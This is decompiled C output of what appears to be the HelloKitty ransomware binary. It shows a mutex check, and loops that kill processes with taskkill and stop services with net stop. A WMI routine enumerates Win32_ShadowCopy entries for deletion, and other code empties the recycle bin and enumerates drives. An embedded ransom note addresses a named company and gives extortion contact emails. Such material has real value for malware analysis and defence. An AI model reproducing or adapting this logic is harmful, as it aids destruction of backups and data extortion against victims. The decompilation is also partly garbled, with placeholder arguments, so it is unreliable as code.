    int32_t lpPerformanceCount; // bp-44, 0x405030
    if (!QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount)) {
        // 0x40522b
        return 0;
    }
    char v2 = processId / 0x1000000; // bp-92, 0x405099
    for (int32_t i = 0; i < 32; i++) {
        // 0x405193
        __asm_rdtsc_10();
        *(char *)(i + (int32_t)a1) = 0;
    }
    // 0x4051af
    int32_t lpSystemTime; // bp-60, 0x405030
    GetSystemTime((struct _SYSTEMTIME *)&lpSystemTime);
    int32_t lpFileTime; // bp-24, 0x405030
    SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime);
    int32_t v3; // 0x405030
    int32_t v4 = function_411910(lpFileTime, v3, 0x2710, 0, 4); // 0x4051d6
    function_404fd0(v4, 0, (int32_t)&g266);
    GetSystemTime((struct _SYSTEMTIME *)&lpSystemTime);
    SystemTimeToFileTime((struct _SYSTEMTIME *)&lpSystemTime, (struct _FILETIME *)&lpFileTime);
    int32_t v5 = function_411910(lpFileTime, v3, 0x2710, 0, 12); // 0x405214
    // 0x40522b
    return function_404fd0(v5, (int32_t)&v2, (int32_t)&g266);
}

// Address range: 0x405240 - 0x4053e4
int32_t function_405240(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4052d0
    int32_t v1; // bp-4, 0x405240
    int32_t v2 = &v1; // 0x405241
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    int32_t v3 = 1; // bp-32, 0x405285
    int32_t * hHeap = GetProcessHeap(); // 0x405293
    int32_t v4 = (int32_t)hHeap; // bp-368, 0x405295
    int32_t v5 = &v4; // 0x405295
    HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
    int32_t v6 = v2 - 324;
    int32_t * v7 = (int32_t *)(v5 - 8);
    int16_t v8 = 512; // bp-328, 0x4052a6
    for (int32_t i = 2; i < 163; i++) {
        int32_t v9 = function_409457(); // 0x4052d0
        *(char *)(v6 + i) = (char)((0x100000000 * (int64_t)(v9 >> 31) | (int64_t)v9) % 254) + 1;
    }
    int32_t * v10 = (int32_t *)(v5 - 4);
    *v10 = 92;
    *(char *)(v2 - 161) = 0;
    *v7 = a2;
    int32_t v11; // bp-327, 0x405240
    *(int32_t *)(v5 - 12) = (int32_t)&v11 + 163;
    function_408e60((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *v10 = (int32_t)&v8;
    function_4041b0((int32_t)&g266);
    int128_t v12; // bp-68, 0x405240
    __asm_movups(0x8000000000000000 * v12 / 0x8000000000000000, __asm_movups_6((int128_t)a3));
    int64_t v13; // 0x405240
    int128_t v14 = __asm_movq(v13); // 0x405335
    *v10 = (int32_t)&v12;
    int64_t v15; // 0x405240
    __asm_movq_3(v15, v14);
    int32_t v16; // bp-56, 0x405240
    *v7 = (int32_t)&v16;
    function_403d10((int32_t)&g266, (int32_t)&g266);
    *v10 = (int32_t)&v3;
    function_404290((int32_t)&g266);
    return 256;
}

// Address range: 0x4053f0 - 0x4053f6
int32_t function_4053f0(void) {
    // 0x4053f0
    return &g254;
}

// Address range: 0x405400 - 0x405682
int32_t function_405400(void) {
    // 0x405400
    int32_t result2; // bp-16, 0x405400
    int32_t result = CoCreateInstance((int32_t)&g21, NULL, 1, &g19, (int32_t **)&result2); // 0x405421
    if (result < 0) {
        // 0x40567b
        return result;
    }
    int32_t v1 = 0; // bp-24, 0x405435
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x40543c
    int32_t v2 = (int32_t)moduleHandle; // bp-108, 0x405442
    int32_t (*func)() = GetProcAddress(moduleHandle, (char *)&g266); // 0x405443
    int32_t v3 = &v2; // 0x405453
    int32_t v4; // bp-116, 0x405400
    int32_t v5; // 0x405400
    int32_t v6; // bp-60, 0x405400
    if (func != NULL) {
        int32_t * processHandle = GetCurrentProcess(); // 0x405459
        v4 = (int32_t)processHandle;
        int32_t v7 = &v4; // 0x40545f
        v3 = v7;
        if (processHandle != NULL && v1 != 0) {
            int32_t v8 = &v6; // 0x40546f
            *(int32_t *)(v7 - 4) = v8;
            VariantInit(&g266);
            v6 = 3;
            *(int32_t *)(v7 - 8) = v8;
            *(int32_t *)(v7 - 12) = 0;
            *(int32_t *)(v7 - 16) = (int32_t)L"__ProviderArchitecture";
            *(int32_t *)(v7 - 20) = result2;
            int32_t v9 = v7 - 24; // 0x40549d
            *(int32_t *)v9 = v8;
            VariantClear((int32_t *)v6);
            v5 = 64;
            v3 = v9;
        }
    }
    // 0x4054a0
    int32_t v10; // bp-28, 0x405400
    *(int32_t *)(v3 - 4) = (int32_t)&v10;
    *(int32_t *)(v3 - 8) = (int32_t)&g18;
    *(int32_t *)(v3 - 12) = 0x4401;
    *(int32_t *)(v3 - 16) = 0;
    int32_t v11 = v3 - 20; // 0x4054b0
    *(int32_t *)v11 = (int32_t)&g20;
    int32_t v12 = CoCreateInstance(v4, &g266, (int32_t)&g266, &g266, (int32_t **)&g266); // 0x4054b5
    int32_t v13 = v11; // 0x4054b9
    if (v12 >= 0 && v10 != 0) {
        // 0x4054c9
        *(int32_t *)(v3 - 24) = (int32_t)L"ROOT\\cimv2";
        int16_t * v14 = SysAllocString((int16_t *)&g266); // 0x4054d4
        int32_t v15 = (int32_t)v14; // 0x4054d4
        int32_t v16; // bp-12, 0x405400
        *(int32_t *)(v3 - 28) = (int32_t)&v16;
        *(int32_t *)(v3 - 32) = result2;
        *(int32_t *)(v3 - 36) = 0;
        *(int32_t *)(v3 - 40) = 0;
        *(int32_t *)(v3 - 44) = 0;
        *(int32_t *)(v3 - 48) = 0;
        *(int32_t *)(v3 - 52) = 0;
        *(int32_t *)(v3 - 56) = v15;
        int32_t v17 = v3 - 60; // 0x4054f0
        *(int32_t *)v17 = v10;
        int32_t v18 = v17; // 0x4054f6
        if (v14 >= NULL) {
            // 0x4054fc
            v18 = v17;
            if (v16 != 0) {
                // 0x405507
                *(int32_t *)(v3 - 64) = 0;
                *(int32_t *)(v3 - 68) = 0;
                *(int32_t *)(v3 - 72) = 3;
                *(int32_t *)(v3 - 76) = 3;
                *(int32_t *)(v3 - 80) = 0;
                *(int32_t *)(v3 - 84) = 0;
                *(int32_t *)(v3 - 88) = 10;
                int32_t v19 = v3 - 92; // 0x405515
                *(int32_t *)v19 = v16;
                uint32_t v20 = CoSetProxyBlanket((int32_t *)v14, (int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x405516
                int32_t v21 = v19; // 0x405524
                if (v20 >= 0) {
                    // 0x40552a
                    *(int32_t *)(v3 - 96) = (int32_t)L"WQL";
                    int16_t * v22 = NULL; // bp-20, 0x40552f
                    int16_t * v23 = SysAllocString(NULL); // 0x405536
                    int32_t v24 = (int32_t)v23; // 0x405536
                    *(int32_t *)(v3 - 100) = (int32_t)L"select * from Win32_ShadowCopy";
                    int16_t * v25 = SysAllocString(v23); // 0x405540
                    int32_t v26 = (int32_t)v25; // 0x405540
                    *(int32_t *)(v3 - 104) = (int32_t)&v22;
                    *(int32_t *)(v3 - 108) = 0;
                    *(int32_t *)(v3 - 112) = 48;
                    *(int32_t *)(v3 - 116) = v26;
                    *(int32_t *)(v3 - 120) = v24;
                    int32_t v27 = v3 - 124; // 0x405556
                    *(int32_t *)v27 = v16;
                    int32_t v28 = v27; // 0x40555c
                    if (v25 >= NULL) {
                        // 0x405562
                        int16_t * lpString; // bp-8, 0x405400
                        int32_t v29 = (int32_t)&lpString; // 0x405568
                        *(int32_t *)(v3 - 128) = v29;
                        lpString = NULL;
                        int32_t v30 = &v1; // 0x405573
                        *(int32_t *)(v3 - 132) = v30;
                        *(int32_t *)(v3 - 136) = 1;
                        *(int32_t *)(v3 - 140) = -1;
                        int32_t v31 = v3 - 144; // 0x40557a
                        *(int32_t *)v31 = (int32_t)v22;
                        v28 = v31;
                        if (lpString != NULL) {
                            int32_t v32 = &v6; // 0x40559a
                            *(int32_t *)(v31 - 4) = 0;
                            *(int32_t *)(v31 - 8) = 0;
                            *(int32_t *)(v31 - 12) = v32;
                            *(int32_t *)(v31 - 16) = 0;
                            *(int32_t *)(v31 - 20) = (int32_t)L"id";
                            int32_t v33 = v31 - 24; // 0x4055a4
                            *(int32_t *)v33 = v1;
                            int32_t v34 = v33; // 0x4055aa
                            int32_t * v35; // 0x4055c9
                            int32_t v36; // 0x4055c9
                            int32_t v37; // 0x4055d4
                            int32_t * v38; // 0x4055d5
                            int32_t * v39; // 0x4055da
                            int32_t v40; // 0x4055db
                            int32_t * v41; // 0x4055e4
                            int32_t * v42; // 0x4055e5
                            int32_t v43; // 0x405613
                            int32_t * v44; // 0x405607
                            int32_t v45; // 0x405609
                            if (v1 >= 0) {
                                // 0x4055ac
                                v34 = v33;
                                if ((int16_t)v6 == 8) {
                                    // 0x4055b3
                                    *(int32_t *)(v31 - 28) = v5;
                                    *(int32_t *)(v31 - 32) = 2 * lstrlenW(lpString) + 52;
                                    *(int32_t *)(v31 - 36) = 8;
                                    *(int32_t *)(v31 - 40) = (int32_t)GetProcessHeap();
                                    v35 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                                    v36 = (int32_t)v35;
                                    v37 = v31 - 44;
                                    *(int32_t *)v37 = v5;
                                    v38 = (int32_t *)(v31 - 48);
                                    *v38 = (int32_t)L"Win32_ShadowCopy.ID='%s'";
                                    v39 = (int32_t *)(v31 - 52);
                                    *v39 = v5;
                                    v40 = lstrlenW((int16_t *)&g266);
                                    v41 = (int32_t *)(v31 - 56);
                                    *v41 = v40 + 26;
                                    v42 = (int32_t *)(v31 - 60);
                                    *v42 = v36;
                                    wnsprintfW();
                                    v45 = v37;
                                    if (v35 != NULL) {
                                        // 0x4055f3
                                        *v38 = 0;
                                        *v39 = result2;
                                        *v41 = 0;
                                        *v42 = v36;
                                        *(int32_t *)(v31 - 64) = v16;
                                        *(int32_t *)(v31 - 68) = v36;
                                        *(int32_t *)(v31 - 72) = 0;
                                        v44 = GetProcessHeap();
                                        v45 = v31 - 76;
                                        *(int32_t *)v45 = (int32_t)v44;
                                        HeapFree(&g266, (int32_t)&g266, &g266);
                                    }
                                    // 0x405610
                                    v43 = v45 - 4;
                                    *(int32_t *)v43 = v32;
                                    VariantClear(&g266);
                                    v34 = v43;
                                }
                            }
                            // 0x405616
                            *(int32_t *)(v34 - 4) = v1;
                            *(int32_t *)(v34 - 8) = v32;
                            VariantClear((int32_t *)lpString);
                            *(int32_t *)(v34 - 12) = v29;
                            lpString = NULL;
                            *(int32_t *)(v34 - 16) = v30;
                            *(int32_t *)(v34 - 20) = 1;
                            *(int32_t *)(v34 - 24) = -1;
                            int32_t v46 = v34 - 28; // 0x40563d
                            *(int32_t *)v46 = (int32_t)v22;
                            v28 = v46;
                            while (lpString != NULL) {
                                int32_t v47 = v46;
                                *(int32_t *)(v47 - 4) = 0;
                                *(int32_t *)(v47 - 8) = 0;
                                *(int32_t *)(v47 - 12) = v32;
                                *(int32_t *)(v47 - 16) = 0;
                                *(int32_t *)(v47 - 20) = (int32_t)L"id";
                                v33 = v47 - 24;
                                *(int32_t *)v33 = v1;
                                v34 = v33;
                                if (v1 >= 0) {
                                    // 0x4055ac
                                    v34 = v33;
                                    if ((int16_t)v6 == 8) {
                                        // 0x4055b3
                                        *(int32_t *)(v47 - 28) = v5;
                                        *(int32_t *)(v47 - 32) = 2 * lstrlenW(lpString) + 52;
                                        *(int32_t *)(v47 - 36) = 8;
                                        *(int32_t *)(v47 - 40) = (int32_t)GetProcessHeap();
                                        v35 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                                        v36 = (int32_t)v35;
                                        v37 = v47 - 44;
                                        *(int32_t *)v37 = v5;
                                        v38 = (int32_t *)(v47 - 48);
                                        *v38 = (int32_t)L"Win32_ShadowCopy.ID='%s'";
                                        v39 = (int32_t *)(v47 - 52);
                                        *v39 = v5;
                                        v40 = lstrlenW((int16_t *)&g266);
                                        v41 = (int32_t *)(v47 - 56);
                                        *v41 = v40 + 26;
                                        v42 = (int32_t *)(v47 - 60);
                                        *v42 = v36;
                                        wnsprintfW();
                                        v45 = v37;
                                        if (v35 != NULL) {
                                            // 0x4055f3
                                            *v38 = 0;
                                            *v39 = result2;
                                            *v41 = 0;
                                            *v42 = v36;
                                            *(int32_t *)(v47 - 64) = v16;
                                            *(int32_t *)(v47 - 68) = v36;
                                            *(int32_t *)(v47 - 72) = 0;
                                            v44 = GetProcessHeap();
                                            v45 = v47 - 76;
                                            *(int32_t *)v45 = (int32_t)v44;
                                            HeapFree(&g266, (int32_t)&g266, &g266);
                                        }
                                        // 0x405610
                                        v43 = v45 - 4;
                                        *(int32_t *)v43 = v32;
                                        VariantClear(&g266);
                                        v34 = v43;
                                    }
                                }
                                // 0x405616
                                *(int32_t *)(v34 - 4) = v1;
                                *(int32_t *)(v34 - 8) = v32;
                                VariantClear((int32_t *)lpString);
                                *(int32_t *)(v34 - 12) = v29;
                                lpString = NULL;
                                *(int32_t *)(v34 - 16) = v30;
                                *(int32_t *)(v34 - 20) = 1;
                                *(int32_t *)(v34 - 24) = -1;
                                v46 = v34 - 28;
                                *(int32_t *)v46 = (int32_t)v22;
                                v28 = v46;
                            }
                        }
                    }
                    // 0x405651
                    *(int32_t *)(v28 - 4) = v24;
                    SysFreeString((int16_t *)&g266);
                    v21 = v28 - 8;
                    *(int32_t *)v21 = v26;
                    SysFreeString((int16_t *)&g266);
                }
                // 0x40565b
                *(int32_t *)(v21 - 4) = v15;
                SysFreeString((int16_t *)&g266);
                int32_t v48 = v21 - 8; // 0x405663
                *(int32_t *)v48 = v16;
                v18 = v48;
            }
        }
        // 0x405669
        v13 = v18 - 4;
        *(int32_t *)v13 = v10;
    }
    // 0x405672
    *(int32_t *)(v13 - 4) = result2;
    // 0x40567b
    return result2;
}

// Address range: 0x405690 - 0x4059b9
int32_t function_405690(void) {
    // 0x405690
    int32_t v1; // 0x405690
    function_411460(v1);
    CoInitialize(NULL);
    int32_t v2 = 1; // bp-28, 0x4056ab
    SetErrorMode(1);
    int32_t v3 = &v2; // 0x4056ba
    if (g237 == 0) {
        int32_t * hObject = OpenMutexW(0x100000, false, L"HelloKittyMutex"); // 0x4056c8
        g237 = (int32_t)hObject;
        int16_t * v4; // bp-44, 0x405690
        if (hObject != NULL) {
            // 0x4056d7
            v4 = (int16_t *)hObject;
            CloseHandle(hObject);
            // 0x405705
            *(int32_t *)((int32_t)&v4 - 4) = 0;
            ExitProcess((int32_t)&g266);
            // UNREACHABLE
        }
        // 0x4056e0
        v4 = L"HelloKittyMutex";
        struct _SECURITY_ATTRIBUTES * v5 = NULL; // bp-52, 0x4056e7
        int32_t v6 = (int32_t)&v5; // 0x4056e7
        int32_t * v7 = CreateMutexW(NULL, false, L"HelloKittyMutex"); // 0x4056e9
        g237 = (int32_t)v7;
        v3 = v6;
        if (v7 == NULL) {
            // 0x4056f8
            v3 = v6;
            if (GetLastError() != 183) {
                // 0x405705
                *(int32_t *)(v6 - 4) = 0;
                ExitProcess((int32_t)&g266);
                // UNREACHABLE
            }
        }
    }
    int32_t * v8 = (int32_t *)(v3 - 4); // 0x40570d
    *v8 = 451;
    function_4059c0((int32_t)&g266);
    int32_t v9 = v3 + 4; // 0x405718
    int32_t * v10 = (int32_t *)v9; // 0x40571c
    *v10 = 0;
    *(int32_t *)(v3 - 12) = v9;
    int16_t * v11 = GetCommandLineW(); // 0x405725
    int32_t v12 = v3 - 16; // 0x40572b
    *(int32_t *)v12 = (int32_t)v11;
    int16_t ** v13 = CommandLineToArgvW((int16_t *)&g266, &g266); // 0x40572c
    int32_t result = (int32_t)v13; // 0x40572c
    *v10 = result;
    if (v13 == NULL) {
        // 0x40573a
        return result;
    }
    int32_t v14 = v12; // 0x405748
    if (*v8 >= 3) {
        // 0x40574a
        *(int32_t *)(v3 - 20) = (int32_t)L"-path";
        int32_t v15 = v3 - 24; // 0x40574f
        *(int32_t *)v15 = *(int32_t *)(result + 4);
        int32_t v16 = lstrcmpiW((int16_t *)&g266, (int16_t *)&g266); // 0x405752
        v14 = v15;
        if (v16 == 0) {
            int32_t * v17 = (int32_t *)(v3 - 28); // 0x40575c
            *v17 = 0xfffe;
            int32_t v18 = function_4096d3(); // 0x405761
            v14 = v15;
            if (v18 != 0) {
                // 0x40576f
                *v17 = *(int32_t *)(*v8 + 8);
                *(int32_t *)(v3 - 32) = v18;
                lstrcpyW((int16_t *)&g266, (int16_t *)&g266);
                *(int32_t *)(v3 - 36) = v18;
                PathRemoveBackslashW((int16_t *)&g266);
                int32_t v19 = v3 - 40; // 0x405784
                *(int32_t *)v19 = v18;
                function_4047c0((int32_t)&g266);
                v14 = v19;
            }
        }
    }
    int32_t v20 = v14; // 0x40578f
    int32_t v21 = 0; // 0x40578f
    int32_t v22 = v14; // 0x40578f
    int32_t v23; // 0x405690
    int32_t v24; // 0x405690
    int32_t v25; // 0x405690
    int32_t v26; // 0x405690
    int32_t v27; // 0x405690
    int32_t v28; // 0x4058e4
    if (*(int32_t *)(v14 + 12) == 1) {
        int32_t * v29 = (int32_t *)(v20 - 4); // 0x4057a3
        *v29 = *(int32_t *)(v21 + (int32_t)&g73);
        int32_t v30 = v20 + 584; // 0x4057a9
        int32_t * v31 = (int32_t *)(v20 - 8); // 0x4057b0
        *v31 = (int32_t)L"/f /im \"%s\"";
        int32_t * v32 = (int32_t *)(v20 - 12); // 0x4057b5
        *v32 = v30;
        wsprintfW((int16_t *)&g266, (int16_t *)&g266);
        *v29 = 1;
        *v31 = 0;
        *v32 = v30;
        *(int32_t *)(v20 - 16) = (int32_t)L"taskkill.exe";
        *(int32_t *)(v20 - 20) = (int32_t)L"open";
        v20 -= 24;
        *(int32_t *)v20 = 0;
        ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
        v21 += 4;
        int32_t v33 = 0; // 0x4057db
        while (v21 < 80) {
            // 0x4057a3
            v29 = (int32_t *)(v20 - 4);
            *v29 = *(int32_t *)(v21 + (int32_t)&g73);
            v30 = v20 + 584;
            v31 = (int32_t *)(v20 - 8);
            *v31 = (int32_t)L"/f /im \"%s\"";
            v32 = (int32_t *)(v20 - 12);
            *v32 = v30;
            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
            *v29 = 1;
            *v31 = 0;
            *v32 = v30;
            *(int32_t *)(v20 - 16) = (int32_t)L"taskkill.exe";
            *(int32_t *)(v20 - 20) = (int32_t)L"open";
            v20 -= 24;
            *(int32_t *)v20 = 0;
            ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
            v21 += 4;
            v33 = 0;
        }
        int32_t v34 = v20;
        int32_t * v35 = (int32_t *)(v34 - 4); // 0x4057e0
        *v35 = *(int32_t *)(v33 + (int32_t)&g74);
        int32_t v36 = v34 + 584; // 0x4057e6
        int32_t v37 = v34 - 8; // 0x4057ed
        int32_t * v38 = (int32_t *)v37;
        *v38 = (int32_t)L"stop \"%s\"";
        int32_t * v39 = (int32_t *)(v34 - 12); // 0x4057f2
        *v39 = v36;
        wsprintfW((int16_t *)&g266, (int16_t *)&g266);
        *v35 = 1;
        *v38 = 0;
        *v39 = v36;
        int32_t * v40 = (int32_t *)(v34 - 16);
        *v40 = (int32_t)L"net.exe";
        *(int32_t *)(v34 - 20) = (int32_t)L"open";
        int32_t v41 = v34 - 24; // 0x40580e
        *(int32_t *)v41 = 0;
        ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
        int32_t v42 = v33 + 4; // 0x405812
        v33 = v42;
        while (v42 < 228) {
            // 0x4057e0
            v34 = v41;
            v35 = (int32_t *)(v34 - 4);
            *v35 = *(int32_t *)(v33 + (int32_t)&g74);
            v36 = v34 + 584;
            v37 = v34 - 8;
            v38 = (int32_t *)v37;
            *v38 = (int32_t)L"stop \"%s\"";
            v39 = (int32_t *)(v34 - 12);
            *v39 = v36;
            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
            *v35 = 1;
            *v38 = 0;
            *v39 = v36;
            v40 = (int32_t *)(v34 - 16);
            *v40 = (int32_t)L"net.exe";
            *(int32_t *)(v34 - 20) = (int32_t)L"open";
            v41 = v34 - 24;
            *(int32_t *)v41 = 0;
            ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
            v42 = v33 + 4;
            v33 = v42;
        }
        // 0x40581d
        *(int32_t *)(v34 - 28) = 0;
        int32_t v43 = v34 - 32; // 0x40581f
        *(int32_t *)v43 = 2;
        int32_t * v44 = CreateToolhelp32Snapshot((int32_t)&g266, (int32_t)&g266); // 0x405821
        int32_t v45 = (int32_t)v44; // 0x405821
        *v40 = v45;
        int32_t v46 = v43; // 0x405830
        if (v44 != (int32_t *)-1) {
            int32_t * v47 = (int32_t *)(v34 - 36); // 0x405836
            *v47 = 556;
            int32_t v48 = v34 - 40; // 0x40583f
            int32_t * v49 = (int32_t *)v48; // 0x40583f
            *v49 = 0;
            *(int32_t *)(v34 - 44) = v37;
            function_4071b0(&g266, (int32_t)&g266, (int32_t)&g266);
            *v38 = 556;
            *v47 = v37;
            *v49 = v45;
            bool v50 = Process32FirstW(&g266, (struct tagPROCESSENTRY32W *)&g266); // 0x405858
            v24 = v48;
            int32_t v51 = v45; // 0x405860
            int32_t v52 = v48; // 0x405860
            if (v50) {
                while (true) {
                  lab_0x405870:;
                    int32_t v53 = 0;
                    int32_t v54 = v24;
                    *(int32_t *)(v54 - 4) = v54 + 60;
                    int32_t v55 = *(int32_t *)(v53 + (int32_t)&g72); // 0x405877
                    int32_t v56 = v54 - 8; // 0x405877
                    *(int32_t *)v56 = v55;
                    uint32_t v57; // 0x405883
                    if (StrStrIW((int16_t *)&g266, (int16_t *)&g266) != NULL) {
                        // 0x405883
                        v57 = *(int32_t *)(v54 + 24);
                        if (v57 >= 1001) {
                            // 0x40589b
                            *(int32_t *)(v54 - 12) = v57;
                            *(int32_t *)(v54 - 16) = (int32_t)L"/f /PID \"%d\"";
                            *(int32_t *)(v54 - 20) = v54 + 576;
                            wsprintfW((int16_t *)&g266, (int16_t *)&g266);
                            v25 = v56;
                            v23 = 3;
                            goto lab_0x4058c0;
                        }
                    }
                    int32_t v58 = v53 + 4; // 0x40588e
                    v26 = v56;
                    while (v58 < 0x1a58) {
                        // 0x405872
                        v53 = v58;
                        v54 = v56;
                        *(int32_t *)(v54 - 4) = v54 + 60;
                        v55 = *(int32_t *)(v53 + (int32_t)&g72);
                        v56 = v54 - 8;
                        *(int32_t *)v56 = v55;
                        if (StrStrIW((int16_t *)&g266, (int16_t *)&g266) != NULL) {
                            // 0x405883
                            v57 = *(int32_t *)(v54 + 24);
                            if (v57 >= 1001) {
                                // 0x40589b
                                *(int32_t *)(v54 - 12) = v57;
                                *(int32_t *)(v54 - 16) = (int32_t)L"/f /PID \"%d\"";
                                *(int32_t *)(v54 - 20) = v54 + 576;
                                wsprintfW((int16_t *)&g266, (int16_t *)&g266);
                                v25 = v56;
                                v23 = 3;
                                goto lab_0x4058c0;
                            }
                        }
                        // 0x40588e
                        v58 = v53 + 4;
                        v26 = v56;
                    }
                    goto lab_0x4058df;
                }
              lab_0x4058f6:
                // 0x4058f6
                v51 = *(int32_t *)(v27 + 8);
                v52 = v28;
            }
            // 0x4058fa
            v46 = v52 - 4;
            *(int32_t *)v46 = v51;
            CloseHandle(&g266);
        }
        // 0x405901
        function_405400();
        *(int32_t *)(v46 - 4) = 1;
        *(int32_t *)(v46 - 8) = 0;
        *(int32_t *)(v46 - 12) = 0;
        SHEmptyRecycleBinA(&g266, (char *)&g266, (int32_t)&g266);
        *(int32_t *)(v46 - 16) = 0;
        function_404990((int32_t)&g266);
        int32_t v59 = v46 + 1592; // 0x405919
        *(int32_t *)(v46 - 20) = v59;
        int32_t v60 = v46 - 24; // 0x405923
        *(int32_t *)v60 = 0x7fff;
        int32_t v61 = GetLogicalDriveStringsW((int32_t)&g266, (int16_t *)&g266); // 0x405928
        v22 = v60;
        if (v61 != 0) {
            // 0x405932
            v22 = v60;
            if (*(int16_t *)(v46 + 1584) != 0) {
                *(int32_t *)(v60 - 4) = 0xfffe;
                *(int32_t *)(v60 - 8) = 8;
                int32_t * v62 = GetProcessHeap(); // 0x40594a
                int32_t v63 = v60 - 12; // 0x40594c
                *(int32_t *)v63 = (int32_t)v62;
                int32_t * v64 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40594d
                int32_t v65 = v63; // 0x405957
                int32_t v66; // 0x40594d
                int32_t * v67; // 0x40595c
                int32_t * v68; // 0x40595d
                int32_t * v69; // 0x405962
                int32_t * v70; // 0x405967
                int32_t * v71; // 0x405981
                if (v64 != NULL) {
                    // 0x405959
                    v66 = (int32_t)v64;
                    v67 = (int32_t *)(v60 - 16);
                    *v67 = (int32_t)*(int16_t *)v59;
                    v68 = (int32_t *)(v60 - 20);
                    *v68 = (int32_t)L"\\\\?\\%c:";
                    v69 = (int32_t *)(v60 - 24);
                    *v69 = 0x7fff;
                    v70 = (int32_t *)(v60 - 28);
                    *v70 = v66;
                    wnsprintfW();
                    *v67 = v66;
                    GetDriveTypeW((int16_t *)&g266);
                    *v68 = v66;
                    function_4047c0((int32_t)&g266);
                    *v69 = v66;
                    *v70 = 0;
                    v71 = GetProcessHeap();
                    v65 = v60 - 32;
                    *(int32_t *)v65 = (int32_t)v71;
                    HeapFree(&g266, (int32_t)&g266, &g266);
                }
                int32_t v72 = v65 - 4; // 0x40598a
                *(int32_t *)v72 = v59;
                int32_t v73 = v59 + 2 + 2 * lstrlenW((int16_t *)&g266); // 0x405994
                v22 = v72;
                while (*(int16_t *)v73 != 0) {
                    int32_t v74 = v73;
                    int32_t v75 = v72;
                    *(int32_t *)(v75 - 4) = 0xfffe;
                    *(int32_t *)(v75 - 8) = 8;
                    v62 = GetProcessHeap();
                    v63 = v75 - 12;
                    *(int32_t *)v63 = (int32_t)v62;
                    v64 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
                    v65 = v63;
                    if (v64 != NULL) {
                        // 0x405959
                        v66 = (int32_t)v64;
                        v67 = (int32_t *)(v75 - 16);
                        *v67 = (int32_t)*(int16_t *)v74;
                        v68 = (int32_t *)(v75 - 20);
                        *v68 = (int32_t)L"\\\\?\\%c:";
                        v69 = (int32_t *)(v75 - 24);
                        *v69 = 0x7fff;
                        v70 = (int32_t *)(v75 - 28);
                        *v70 = v66;
                        wnsprintfW();
                        *v67 = v66;
                        GetDriveTypeW((int16_t *)&g266);
                        *v68 = v66;
                        function_4047c0((int32_t)&g266);
                        *v69 = v66;
                        *v70 = 0;
                        v71 = GetProcessHeap();
                        v65 = v75 - 32;
                        *(int32_t *)v65 = (int32_t)v71;
                        HeapFree(&g266, (int32_t)&g266, &g266);
                    }
                    // 0x40598a
                    v72 = v65 - 4;
                    *(int32_t *)v72 = v74;
                    v73 = v74 + 2 + 2 * lstrlenW((int16_t *)&g266);
                    v22 = v72;
                }
            }
        }
    }
    int32_t v76 = v22;
    function_401960();
    function_404a60();
    *(int32_t *)(v76 - 4) = *(int32_t *)(v76 + 20);
    LocalFree(&g266);
    *(int32_t *)(v76 - 8) = 0;
    ExitProcess((int32_t)&g266);
    // UNREACHABLE
  lab_0x4058df:
    // 0x4058df
    v27 = v26;
    *(int32_t *)(v27 - 4) = v27 + 24;
    v28 = v27 - 8;
    *(int32_t *)v28 = *(int32_t *)(v27 + 16);
    bool v77 = Process32NextW(&g266, (struct tagPROCESSENTRY32W *)&g266); // 0x4058e8
    v24 = v28;
    if (!v77) {
        // break -> 0x4058f6
        goto lab_0x4058f6;
    }
    goto lab_0x405870;
  lab_0x4058c0:;
    int32_t v78 = v25;
    *(int32_t *)(v78 - 4) = 1;
    *(int32_t *)(v78 - 8) = 0;
    *(int32_t *)(v78 - 12) = v78 + 584;
    *(int32_t *)(v78 - 16) = (int32_t)L"taskkill.exe";
    *(int32_t *)(v78 - 20) = (int32_t)L"open";
    int32_t v79 = v78 - 24; // 0x4058d6
    *(int32_t *)v79 = 0;
    ShellExecuteW(&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
    int32_t v80 = v23 - 1; // 0x4058da
    v25 = v79;
    v23 = v80;
    v26 = v79;
    if (v80 != 0) {
        goto lab_0x4058c0;
    } else {
        goto lab_0x4058df;
    }
}

// Address range: 0x4059c0 - 0x405b20
int32_t function_4059c0(uint32_t a1) {
    uint32_t v1 = g147; // 0x4059c4
    if (v1 >= a1) {
        // 0x4059d7
        g146 = a1;
        int32_t v2 = 2 * a1; // 0x4059e0
        int32_t v3 = v1 >= 8 ? (int32_t)g145 : (int32_t)&g145; // 0x4059e8
        function_4088e0(v3, L"Hello Technology and Strategy!\r\nAll your fileservers, HyperV infrastructure and backups have been encrypted!\r\nTrying to decrypt or modify the files with programs other than our decryptor can lead to permanent loss of data!\r\nThe only way to recover your files is by cooperating with us.\r\nTo prove our seriousness, we can decrypt 1 non - critical file for free as proof.\r\n\r\nContacts:\r\nTECHANDSTRATsupport@secmail.pro\r\nTECHANDSTRATsuport@protonmail.com\r\n", v2);
        *(int16_t *)(v3 + v2) = 0;
        return (int32_t)&g145;
    }
    if (a1 >= 0x7fffffff) {
        // 0x405b19
        function_405b20();
        __asm_int3();
        return __asm_int3();
    }
    uint32_t v4 = a1 | 7; // 0x405a20
    int32_t v5 = 0x7ffffffe; // 0x405a29
    int32_t v6; // 0x4059c0
